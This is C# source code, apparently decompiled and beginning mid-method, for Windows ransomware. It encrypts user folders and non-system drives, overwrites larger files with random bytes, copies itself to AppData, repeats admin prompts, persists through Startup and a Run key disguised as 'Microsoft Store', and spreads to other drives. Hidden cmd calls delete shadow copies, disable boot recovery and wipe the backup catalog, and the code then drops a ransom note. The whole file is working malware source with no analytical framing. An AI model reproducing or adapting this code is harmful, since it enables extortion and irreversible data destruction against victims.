		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>wQDr6WQmdpeTmWv3W+4Hp4VpZEvjRNcM7qszwKbC8flkBaO+4nqh/mnRHYUaCXX/J0pitu4/ZqOf6vQtsxvt91oblJKttqo+WZSywyqkyu1pXAMm3M0BVGnPcA58jgV68zuJvCuMFitj7/l45nm6h9fOofc7w09aY9USBz3qTrU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
